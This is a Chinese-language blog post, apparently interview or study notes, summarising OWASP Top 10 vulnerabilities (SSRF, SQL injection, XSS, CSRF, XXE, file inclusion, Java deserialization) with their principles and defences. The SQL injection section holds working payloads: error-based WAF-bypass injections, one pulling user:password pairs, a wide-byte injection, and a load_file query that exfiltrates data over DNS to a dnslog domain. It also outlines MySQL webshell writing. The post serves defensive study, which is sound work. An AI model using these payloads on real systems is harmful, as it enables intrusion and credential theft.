---
title: "OWASP Top 10 选讲"
date: 2024-04-15
description: "常规漏洞的原理和防御"
tags: ["蓝队理论"]
featured_image: ""
# images is optional, but needed for showing Twitter Card
images: []
categories: "sec"
comment: false
draft: false
---

这里对 OWASP 在 2013、2017、2021 年提出的十大常规漏洞的原理和防御进行选择性的总结。OWASP 是一个致力于网络安全的国际非盈利组织，OWASP Top 10 是定期更新的报告，概述了 Web 应用程序安全性的安全问题，重点关注 10 个最关键的风险。

### ssrf

#### 防御 ssrf

（1）设置 url 白名单，限制内网 ip 的访问；

（2）禁用非常规协议和端口，例如禁用除 http/s 之外的协议、禁用除 80/443 之外的端口；

（3）统一报错信息，避免根据报错信息的不同判断内网 ip 端口的开放状态。

#### 利用 ssrf

（1）dict 协议泄露了软件版本；

（2）file 协议读取敏感文件；

（3）gopher 协议反弹 shell；

（4）http/s 协议扫描内网端口。

#### ssrf 出现的场景

凡是用户输入的 url 和服务器进行交互的地方都可能存在 ssrf。例如：（1）用 url 分享网页信息；（2）在线翻译/转码；（3）图片加载/下载；（4）图片/文章的收藏；（5）未授权访问的页面里面有 ssrf；（6）url 锚点包含 ssrf。

#### ssrf 绕过限制

ip rebind

### sql 注入

#### sql 注入如何判断数据库类型

(1) 从语言习惯判断。

asp：SQL Server，Access

.net ：SQL Server

php：Mysql，PostgreSql

java：Oracle，Mysql

（2）从默认端口判断。

Mysql: 3306

Oracle :1521

SQL Server :1433

PostgreSQL :5432

Access : 文件型数据库没有默认端口

（3）从页面报错判断。

Oracle: ORA-00933:SQLcommand not properly ended

SQL Server: Msg 170,level 15, State 1,Line 1

Mysql: you have an error in your SQL syntax

（4）从特有表判断

几个数据库都可以使用 payload
    
    http://127.0.0.1/test.php?id=1 and (select count(*) from 特有表)>0 and 1=1

Oracle: sys.usr_tables

Mysql: information_schema.tables

SQL Server: sysobjects

Access: msyobjects

确认注入点之后把特有表带进去看看哪个不报错就是哪个。

#### mysql 注入的常用函数有哪些

查询字段用 order by，联合查询用 union select

延时盲注用 sleep

报错注入一般用 updatexml 和 extractvalue，用 floor 也可以

#### 冷门报错注入函数绕 waf

    1' and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),0x2b,floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1

    and multipoint((select * from(select * from(select version())a)b))

    and geometrycollection((select * from(select * from(select version())a)b))

    or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e))) as asd))

#### 宽字节注入的原理和条件是什么

如果网站在用户输入的引号前面加了反斜杠进行转义，而网站使用 gbk 编码，则 sql 注入点符合宽字节注入的条件。

payload: %df’+or+1=1#

%df' 被十六进制编码变为 %df%5c%27，而 df5c 被 gbk 编码变为汉字“运”，从而单引号 %27 被解析。

#### mysql 写 shell 的方法

（1）导出函数写 shell。一句话导出或者创建表导出，可以用函数 outfile 和 dumpfile。

（2）日志文件写 shell。把日志设置成木马文件，将 shell 写进日志。

#### mysql 无法写 shell 的原因

（1）打开 mysql 配置文件 My.ini 设置 secure_file_priv=null 可以禁止导入导出。与之相对，如果设置为 / 或者置空则无限制，如果设置为某个目录则在该目录下可以导入导出。从防守方的角度来看设置为 null 安全，可以用命令 show global variables like '%secure%' 快速检查配置。

（2）绝对路径不正确则无法写 shell。从防守方的角度来看不泄露绝对路径可以防止 mysql 写 shell。

（3）权限不足导致无法写 shell。没有 file 读写权限或者无权限开启日志记录。

（4）在 PHP 设置中禁用魔术引号，即开启 GPC，对引号进行转义，则无法写 shell。

（5）站库分离导致无法连接 mysql，则无法写 shell。

#### 如何利用 dns 外带 sql 注入结果

load_file 函数的作用是读取远程文件，可以解析 url。攻击者可以将 sql 注入的结果拼接到域名，在 dnslog 平台看到结果。

    select load_file(concat('file:\\\\',(select database()),'.qx7x7i.dnslog.cn'));

条件：secure_file_priv 选项必须为空，不能为null；对方的主机必须开放 445 端口。

#### sqlmap 扫描 https 网站无法访问怎么办

（1）添加 --force-ssl 参数；（2）走本地代理端口。

#### mysql 通常采取哪种加密方式

sha1，md5

#### 防御 sql 注入

（1）后端代码层面：

正则过滤：不传输 payload

预编译：不解析 payload

转义：改写 payload 令其失效

权限控制：就算解析 payload 语句攻击者也没有读写权限，攻击者得不到任何信息和权限。

（2）网络传输层面：配置 waf 进行拦截，不把带有 payload 的语句传输到后端。

#### order by 能预编译吗

不能，只能加 waf

### xss

#### xss 的原理

用户输入的 js 代码被浏览器解析了，那么 js 能做的就是 xss 能做的。

#### xss 的危害

（1）盗取 cookie；（2）获取受害者 ip；（3）屏幕截图；（4）记录键盘输入；（5）前端 js 挖矿；（6）xss 蠕虫；（7）水坑攻击；（8）dos 攻击。

#### xss 绕 waf

常用绕过方法：双写大小写、编码、找没被禁用的标签、没被禁用的事件、不常见的语句

#### httponly 的绕过

有些接口会返回 set-cookie；用 ajax 或 flash 进行 http trace 攻击可以回显 cookie。

#### 防御 xss

过滤、实体编码、cookie 设置 http only、限制输入长度

### csrf

#### csrf 的条件

用户浏览器里面保存着有效的 cookie，并且使用同一个浏览器访问钓鱼链接。

#### csrf 的防御

（1）使用正确的 cors 配置，验证 origin 和 referer；

（2）设置 csrf token，用户点击钓鱼链接不会携带 csrf token 就无法通过身份认证。

### xxe 注入

#### xxe 的危害

因为后端解析了 xml 外部实体，并且支持 file 和 ftp 等协议，导致 xxe 注入可以造成访问内网、任意文件读取和下载、dos 攻击等危害。

#### xxe 的防御

XML 解析库在调用时严格禁止对外部实体的解析。

### 文件包含漏洞

#### 文件包含的原理

文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。

#### 文件包含的利用

（1）加载图片马；（2）包含被污染的日志进行 getshell；（3）file 协议造成任意文件读取

### java 反序列化

#### java 反序列化漏洞概述

字节流变为 java 对象称为反序列化，反之称为序列化。由于 java 反序列化方法的不慎调用，用户在 http 报文输入的字节流能够被后端当作 java 对象解析。因此攻击者可以利用这个漏洞构造恶意语句交给后端执行。主要危害是 rce 和 dos，现实中一般需要多个漏洞配合利用才能造成实际危害，称为反序列化利用链。

#### jndi 注入

jndi 是 java 接口，可以访问命名和目录服务。jndi 的 lookup 方法的 uri 参数可控，攻击者注入一个恶意 url，存储一个 java payload，这个 url 被加载时 payload 被解析，造成了注入攻击。

#### rmi

rmi 即远程方法调用，分为三个部分：客户端进行方法的调用，服务端提供方法、对代码进行解析，注册中心相当于一个字典，客户端调用服务端的方法时在注册中心进行查询和引用。

#### java 反序列化利用工具

ysoserial 集成了很多利用链，只需要查看网站的第三方组件，然后在 ysoserial 里面找对应的利用链。

#### java 反序列化的常见利用链

#### shiro550 和 shiro721 有什么区别

shiro550 的 cookie 会有一个 rememberme 的值，并且这个值是很长的一个字符串。

shiro550 使用 aes+base64 加密，密钥写死在代码里面。知道了密钥可以碰撞解密，写 payload 再加密，替换原来的 rememberme 字段，这个 rememberme 最终被反序列化，payload 被后端解析。

shiro721 不需要知道 key，但是需要一个合法登录用户的 cookie 进行 padding oracle 填充攻击。

#### fastjson rce 流程

fastjson 将 java 对象序列化为 json 字节流，将 json 字节流反序列化为 java 对象。fastjson 使用 rmi 或者 ldap 协议（远程方法调用、情形目录访问）。

简单描述一下 fastjson rce 的流程。攻击者的 payload 被受害者的服务器反序列化解析后，通过 jndi 连接攻击者指定的 rmi 服务器。攻击者 rmi 服务器向受害者服务器返回一个对象。受害者服务器检测到本地不存在该对象，向攻击者提供的地址请求恶意 class 文件。受害者服务器收到 class 文件后加载进内存，实例化的时候执行构造函数，完成 rce。

#### 如何判断 log4j2 是否利用成功

log4j2 是日志组件，其 lookups 机制存在 jndi 注入。

（1）出网一般走 rmi/ldap/dns，配合 ids 查看目标主机是否外带攻击；

（2）查看目标主机是否存在 dnslog 活动；

（3）查看是否下载恶意类。

#### struts2 反序列化原理

Struts2 对标签属性执行 ognl（对象图形导航语言）解析，可造成 rce。

#### weblogic 历史漏洞

（1）t3 协议引起的反序列化漏洞；（2）Gadget 造成的 rce；（3）任意文件上传；（4）ssrf。